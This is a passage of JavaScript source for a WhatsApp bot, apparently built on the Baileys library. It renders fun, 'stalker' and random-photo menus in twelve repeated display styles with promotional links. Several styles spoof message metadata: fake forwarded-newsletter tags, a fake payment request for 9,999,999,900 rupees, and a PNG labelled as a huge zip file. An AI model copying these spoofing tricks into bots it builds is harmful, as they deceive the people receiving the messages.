   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'funmenu': {
ToxxicTechInc.sendMessage(from, { react: { text: randomEmoji, key: m.key } });
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${funmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'stalkermenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${stalkermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU ??",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'randomphotomenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${randphotomenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
